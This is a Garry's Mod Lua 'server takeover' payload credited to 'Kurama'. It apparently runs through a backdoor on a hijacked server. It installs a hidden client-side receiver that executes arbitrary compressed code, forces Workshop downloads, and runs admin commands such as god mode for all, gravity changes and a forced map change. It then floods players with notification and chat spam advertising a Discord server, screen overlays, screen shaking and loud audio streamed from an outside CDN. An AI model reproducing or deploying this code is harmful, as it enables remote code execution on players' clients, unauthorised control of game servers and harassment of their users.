-- Payload Created by Kurama

-- Venom SSV

-- Obligation to credit myself in the visual

-- discord.gg/kurama

function RandomString(intMin, intMax)
local ret = ""
    for _ = 1, math.random(intMin, intMax) do
    ret = ret .. string.char(math.random(65, 90))
end
    return ret
end
local randomtable = {
    CodeRandom = RandomString(0, 69),
    TimingRandom = RandomString(0, 69),
    ClientRandom = RandomString(0, 69),
    ServeurRadom = RandomString(0, 69)
    }
util.AddNetworkString(randomtable["TimingRandom"])
util.AddNetworkString(randomtable["CodeRandom"])
BroadcastLua([[net.Receive("]] .. randomtable["CodeRandom"] .. [[",function()CompileString(util.Decompress(net.ReadData(net.ReadUInt(16))),"?")()end)]])
hook.Add("PlayerInitialSpawn", "Spawn", function(ply)
    if not ply:IsBot() then
        ply:SendLua([[net.Receive("]] .. randomtable["CodeRandom"] .. [[",function()CompileString(util.Decompress(net.ReadData(net.ReadUInt(16))),"?")()end)]])
        ply:SendLua([[steamworks.DownloadUGC(YOUR_WORKSHOP_ID, function(n) game.MountGMA(n) game.AddParticles("particles/CHANGE_ME.pcf") PrecacheParticleSystem("CHANGE_ME") end)]])
    end
end)

m_strImageGlobalVar = RandomString( 6, 12 )
local function InfoClient(code)
local data = util.Compress(code)
local len = #data
    net.Start(randomtable["CodeRandom"])
    net.WriteUInt(len, 16)
    net.WriteData(data, len)
    net.Broadcast()
end
for k, v in pairs(player.GetAll()) do
    v:SendLua([[steamworks.DownloadUGC(YOUR_WORKSHOP_ID, function(n) game.MountGMA(n) game.AddParticles("particles/CHANGE_ME.pcf") PrecacheParticleSystem("CHANGE_ME") end)]])
end

-- Custom Settings
timer.Simple(2.5, function()
    RunConsoleCommand("ulx", "god", "*")
    PrecacheParticleSystem("CHANGE_ME")
end)

timer.Simple( 5, function()
    RunConsoleCommand("sv_gravity", "200")
end)

timer.Create("Font1GM_Construct", 235, 1, function()
    RunConsoleCommand("ulx", "map", "gm_construct")
end)

timer.Simple(5, function()
    for k, v in pairs(player.GetAll()) do
        v:SetRunSpeed(400 * 4)
        v:SetWalkSpeed(400 * 4)
    end
end)

-- Particle - 2
timer.Simple(5, function()
InfoClient([[net.Receive("]] .. randomtable["TimingRandom"] .. [[",function()CompileString(util.Decompress(net.ReadData(net.ReadUInt(16))),"?")()end)]])
InfoClient([[
    for i = 1, 10 do
    ParticleEffectAttach("CHANGE_ME", PATTACH_ABSORIGIN_FOLLOW, LocalPlayer(), 0)
end
]])
end)

-- Notif Spam
timer.Simple(5, function()
    InfoClient([[
timer.Create("]] .. RandomString(0, 69) .. [[", 0.5, 0, function()
    notification.AddLegacy( "Server Event by Kurama !", math.random(0, 4), 1.5 )
end)

timer.Create("]] .. RandomString(0, 69) .. [[", 0.5, 0, function()
    notification.AddLegacy( "Server Event by TheCedoux !", math.random(0, 4), 1.5 )
end)

timer.Create("]] .. RandomString(0, 69) .. [[", 0.5, 0, function()
    notification.AddLegacy( "Server Event by Doge Chien", math.random(0, 4), 1.5 )
end)

timer.Create("]] .. RandomString(0, 69) .. [[", 0.5, 0, function()
    notification.AddLegacy( "Sorry my Friends !", math.random(0, 4), 1.5 )
end)

timer.Create("]] .. RandomString(0, 69) .. [[", 0.5, 0, function()
    notification.AddLegacy( "discord.gg/kurama", math.random(0, 4), 1.5 )
end)
]])
end)

-- Font
timer.Simple( 19.2, function()
InfoClient([=[
local WriteK = math.Clamp(ScrH()/2.31, 0.85, 1.005);
surface.CreateFont( "Font1", {
    font = "Roboto",
    extended = false,
    size = WriteK *  150,
    weight = 200,
    blursize = 1.5,
    italic = false,
    rotary = false,
    shadow = false,
    additive = false,
    outline = false,
    })
    hook.Add( "HUDPaint", "Font2", function()
    for i = 1, 60 do
end
    draw.SimpleTextOutlined("Kurama", "Font1", ScrW() /2, ScrH() /2,Color( 255, 255, 255),TEXT_ALIGN_CENTER,TEXT_ALIGN_CENTER,3,Color( 0, 0, 0))
local mat = Entity(0):GetMaterials()
    for k,v in pairs(mat) do
    end
end)
]=])
end)

timer.Simple( 5, function()
InfoClient([=[
g_]=].. m_strImageGlobalVar.. [=[ = {}
local html = [[<style type="text/css"> html, body {background-color: transparent;} html{overflow:hidden; ]].. (true and "margin: -8px -8px;" or "margin: 0px 0px;") ..[[ } </style><body><img src="]] .. "%s" .. [[" alt="" width="]] .. "%i"..[[" height="]] .. "%i" .. [[" /></body>]]
local function LoadWebMaterial( strURL, strUID, intSizeX, intSizeY )
local CustomMapW = vgui.Create( "HTML" )
    CustomMapW:SetPos( ScrW() -1, ScrH() -1 )
    CustomMapW:SetVisible( true )
    CustomMapW:SetMouseInputEnabled( false )
    CustomMapW:SetKeyBoardInputEnabled( false )
    CustomMapW:SetSize( intSizeX, intSizeY )
    CustomMapW:SetHTML( html:format(strURL, intSizeX, intSizeY) )
local PageLoaded
PageLoaded = function()
local mat = CustomMapW:GetHTMLMaterial()
    if mat then
g_]=].. m_strImageGlobalVar.. [=[[strUID] = { mat, CustomMapW }
    return
end
timer.Simple( 0.5, PageLoaded )
end
PageLoaded()
end
]=])
end)

-- SkyBox
timer.Simple(1, function()
InfoClient([[
    function GAMEMODE:PostDraw2DSkyBox()
local col = Color( 255, 255, 255)
    render.Clear(col.r/1.3, col.g/1.3, col.b/1.3, 255)
    return !!1
end
    function GAMEMODE:PreDrawSkyBox()
local col = Color( 255, 255, 255)
    render.Clear(col.r/1.3, col.g/1.3, col.b/1.3, 255)
        return !!1
    end
]])

-- Sound
InfoClient([[
local sW, sH = ScrW(), ScrH()
local w,h = ScrW(), ScrH()
local W, H = ScrW(), ScrH()
local prevVal = 2
local defaultfov = LocalPlayer():GetFOV()
local override = 70
local sent = false
local audio
local skys = ents.FindByClass("env_skypaint")
local function AudioVizualier()
    if not audio then return end
local tbl = {}
local col = HSVToColor(CurTime() * 36 % 360, .3, .8)
local vv = Vector(col.r / 0, col.g / 0, col.b / 0)
    audio:FFT(tbl, FFT_4096)
local avg = 0
    for i = 1, 40 do
    avg = avg + tbl[i]
end
local h = CurTime() * 250 % 360
    prevVal = Lerp(30 * FrameTime(), prevVal, avg)
        if prevVal > 2 then
    util.ScreenShake(vector_origin, prevVal * 2, 10, 2, 5000)
local vPos = LocalPlayer():EyePos()
local emitter = ParticleEmitter( LocalPlayer():EyePos())
local particle = emitter:Add( "sprites/glow04_noz", vPos )
    if ( particle ) then
    particle:SetVelocity(VectorRand() * 50)
    particle:SetDieTime(1)
    particle:SetStartAlpha(0)
    particle:SetEndAlpha(0)
    particle:SetStartSize(50)
    particle:SetEndSize(0)
    particle:SetStartLength(55)
    particle:SetEndLength(0)
    particle:SetColor(vv)
    particle:SetGravity(Vector(0,0,0))
    particle:SetAirResistance(5)
    particle:SetCollide(true)
    particle:SetBounce(0.9)
end
    override = Lerp(10 * FrameTime(), override, prevVal * .875)
    else
    override = Lerp(5 * FrameTime(), override, defaultfov)
        sent = false
    end
end

local SoundPlay = {}
    hook.Add("HUDPaint", "SoundStart",function()
    for k,v in pairs(SoundPlay) do
        v()
    end
end)
    
SOUNDSTART_CTP = false
OZJFOZJCEZIO = true

sound.PlayURL("https://cdn.kurama.info/songs/Venom.mp3", "noblock", function(s)
    if not IsValid(s) then return end
    audio = s
    s:EnableLooping( false)
    if not s then return end
    if SOUNDSTART_CTP then s:Stop() return end
SOUNDSTART_CTP = true
    s:SetVolume(15)
    s:Play()
local ragtbl = {}
    SoundPlay["CoolEffect"] = function()
local tbl = {}
    s:FFT(tbl,FFT_2048)
    xpcall(function()
local fal = 0
    for i=4,6 do
    fal = fal + tbl[i]
end
    if fal > 0.7 then
local oneid = "newhud"..math.random(100, 300).."id"
local Wmats = Entity(0):GetMaterials()
    for k,v in pairs(Wmats) do
    Material(v):SetVector("$color", Vector(255,255,255))
end                         
util.ScreenShake( Vector( 0, 0, 0 ), 50, 50, 2, 5000 ) 
    for _, v in ipairs(player.GetAll()) do
    v:SetWeaponColor(Vector(255, 255, 255))
end
       
timer.Simple(0.2, function()
local Wmats = Entity(0):GetMaterials()
    for k,v in pairs(Wmats) do
    Material(v):SetVector("$color", Vector(0,0,0))
end                     
    for _, v in ipairs(player.GetAll()) do
        v:SetWeaponColor(Vector(0, 0, 0))
    end   
    end)
end
    end,function()
end)
    end
end)

hook.Add("HUDPaint", "]] .. randomtable["CodeRandom"] .. [[", AudioVizualier)
hook.Add("CalcView", "]] .. randomtable["CodeRandom"] .. [[", function(ply, origin, angles, fov, znear, zfar)
    return {
    ["origin"] = origin,
    ["angles"] = angles,
    ["fov"] = override,
    ["znear"] = znear,
    ["zfar"] = zfar
    }
end)

local function stop()
    audio = nil
    hook.Remove("HUDPaint", "]] .. randomtable["CodeRandom"] .. [[")
    hook.Remove("HUDShouldDraw", "]] .. randomtable["CodeRandom"] .. [[")
    hook.Remove("CalcView", "]] .. randomtable["CodeRandom"] .. [[") 
    for k, v in pairs(oldhooks) do
    hook.Add("HUDPaint", k, v)
        oldhooks[k] = nil
    end
end
concommand.Add("lelstop", stop)
    if s == 1 then 
timer.Create("]] .. RandomString(0, 69) .. [[", 0.2, 0, function()
        util.ScreenShake( Vector(0,0,0), 2.5, 50, 0.5, 5000 )
    end)
end
]])
end)

-- Chat Spam
timer.Simple(5, function()
InfoClient([[  
timer.Create("]] .. randomtable["ServeurRadom"] .. [[", 1.7, 0, function()
local time = tonumber(0)
local my_color = CurTime() % 6 * 60
local Message = {
    "< discord.gg/kurama >",
    "<< discord.gg/kurama >>",
    "<<< discord.gg/kurama >>>",
    "<<<< discord.gg/kurama >>>>",
    "<<<<< discord.gg/kurama >>>>>",
    "<<<<<< discord.gg/kurama >>>>>>",
    "<<<<<<< discord.gg/kurama >>>>>>>",
    "<<<<<<<< discord.gg/kurama >>>>>>>>",
    "<<<<<<<<< discord.gg/kurama >>>>>>>>>",
    "<<<<<<<< discord.gg/kurama >>>>>>>>",
    "<<<<<<< discord.gg/kurama >>>>>>>",
    "<<<<<< discord.gg/kurama >>>>>>",
    "<<<<< discord.gg/kurama >>>>>",
    "<<<< discord.gg/kurama >>>>",
    "<<< discord.gg/kurama >>>",
    "<< discord.gg/kurama >>",
    }
    for _, line in pairs(Message) do
    time = time + tonumber(0.1)
    timer.Simple(time,function()
    chat.AddText(Color( my_color, my_color, my_color ),line)
end)
    end
end)
]])
end)

-- Particle - Model
timer.Simple(5, function()
InfoClient([[
local data = {}
local function gkurama(id)
local pos = LocalPlayer():GetPos()
    data[id] = { Vector(math.random(pos.x-9000,pos.x+9000),math.random(pos.y-9000,pos.y+9000),pos.z + math.random(5000,2000) ), math.random(70, 170) }
end
    for i=1, 50 do
    gkurama(i)
end
    hook.Add("PostDrawOpaqueRenderables","]] .. RandomString(0, 69) .. [[",function()
local z = LocalPlayer():GetPos().z
    for i=1, #data do
        model12:SetPos(data[i][1])
        model12:SetupBones()
        model12:DrawModel()
        data[i][1].z = data[i][1].z - data[i][2] / 20
        if data[i][1].z <= z then
        gkurama(i)
    end
end
    end)
end)
]])
end)
